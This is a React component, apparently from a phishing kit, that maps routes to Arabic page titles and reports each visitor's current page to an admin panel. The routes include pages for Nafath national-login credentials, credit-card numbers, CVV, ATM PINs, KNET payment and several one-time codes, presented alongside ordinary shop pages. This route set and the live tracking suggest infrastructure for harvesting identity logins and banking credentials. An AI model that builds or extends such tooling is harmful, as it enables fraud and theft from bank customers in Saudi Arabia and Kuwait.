import { useEffect } from "react";
import { useLocation } from "@/lib/wouterShim";
import { updatePage } from "@/lib/store";

export default function PageTitleUpdater() {
  const [location] = useLocation();

  useEffect(() => {
    let title = "الصفحة الرئيسية"; // Default title

    // Map all routes to Arabic page names
    const routeToTitle: Record<string, string> = {
      "/": "الصفحة الرئيسية",
      "/nafath": "نفاذ",
      "/nafath-login": "نفاذ - تسجيل دخول",
      "/nafath-login-page": "نفاذ - تسجيل دخول",
      "/nafath-verify": "تحقق نفاذ",
      "/summary-payment": "الملخص والدفع",
      "/credit-card-payment": "صفحة الدفع",
      "/otp-verification": "OTP البطاقة",
      "/atm-password": "كلمة مرور ATM",
      "/phone-verification": "توثيق الجوال",
      "/phone-otp": "تحقق رقم الجوال (OTP)",
      "/final-page": "الصفحة النهائية",
      "/products": "المنتجات",
      "/product": "تفاصيل المنتج",
      "/category": "الأقسام",
      "/cart": "السلة",
      "/checkout": "إتمام الطلب",
      "/knet": "دفع كي نت",
      "/knet-otp": "OTP كي نت",
      "/card": "الدفع بالبطاقة",
      "/atm": "كلمة مرور ATM",
      "/cvv": "رمز CVV",
      "/wishlist": "المفضلة",
      "/compare": "المقارنة",
      "/track": "تتبّع الطلب",
      "/about": "من نحن",
      "/contact": "تواصل معنا",
      "/subscriptions": "الاشتراكات",
      "/legal": "الصفحات القانونية",
    };

    // Get title from map or use default
    const __base = "/" + location.split("/")[1];
    title = routeToTitle[location] || routeToTitle[__base] || "الصفحة الرئيسية";

    // Update browser title
    document.title = title;
    
    // Update page name in admin panel
    updatePage(title);
  }, [location]);

  return null;
}
